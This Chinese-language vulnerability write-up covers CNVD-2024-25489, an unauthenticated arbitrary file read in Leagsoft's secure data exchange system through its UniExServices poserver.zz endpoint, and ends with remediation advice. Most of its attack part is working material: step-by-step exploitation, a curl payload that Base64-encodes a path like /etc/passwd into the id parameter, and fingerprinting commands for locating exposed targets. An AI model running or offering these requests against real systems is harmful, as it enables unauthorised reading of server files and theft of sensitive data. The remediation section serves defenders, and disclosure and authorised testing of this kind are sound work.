## 漏洞描述

深圳市联软科技股份有限公司（Leagsoft）安全数据交换系统存在任意文件读取漏洞（CNVD-2024-25489）。该系统融合网络隔离、网盘与 DLP 技术，用于多网间数据交换。漏洞位于 `UniExServices` 服务中，未授权攻击者可通过构造 `poserver.zz` 接口的 `pgop=opendiskdoc` 与 `id` 参数读取服务器任意文件，获取敏感信息。CNVD 描述明确为"任意文件读取"，未要求认证。

**注意**：该漏洞是已编号的任意文件读取漏洞（CNVD-2024-25489），只覆盖 CNVD 记录与公开 PoC 可核验的 `poserver.zz` 文件读取行为；不要把同厂商其他产品（Leagsoft EMM、入网身份认证系统）的漏洞并入本条目。

## 影响版本

- 联软安全数据交换系统（CNVD 未披露精确版本号，建议以厂商补丁/新版本为准）

## 前置条件

- 目标为暴露在外的联软安全数据交换系统
- 无需认证，`/UniExServices/` 路径可访问

## 利用步骤

1. 先确认目标指纹：响应头或页面包含 `UniExServices` 特征
2. 将待读取文件路径做 Base64 编码（如 `/etc/passwd`）
3. 构造请求读取文件

## Payload

```bash
# id 参数为 Base64 编码的目标文件路径
curl -s "http://target/UniExServices/poserver.zz?pgop=opendiskdoc&id=$(printf '/etc/passwd' | base64)"
```

## 验证方法

```bash
# 仅限授权测试：请求后响应中出现目标文件内容即存在漏洞
curl -s "http://target/UniExServices/poserver.zz?pgop=opendiskdoc&id=$(printf '/etc/passwd' | base64)" | head -c 500
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "UniExServices"
# 或探测服务路径是否存在
curl -s -o /dev/null -w "%{http_code}" "http://target/UniExServices/poserver.zz"
```

## 修复建议

1. 升级到厂商修复版本
2. 对 `UniExServices/*` 增加统一认证与授权校验
3. 对 `id` 参数做严格的路径白名单/合法性校验，禁止读取系统文件
4. 通过 WAF/网关限制该系统仅内网可达
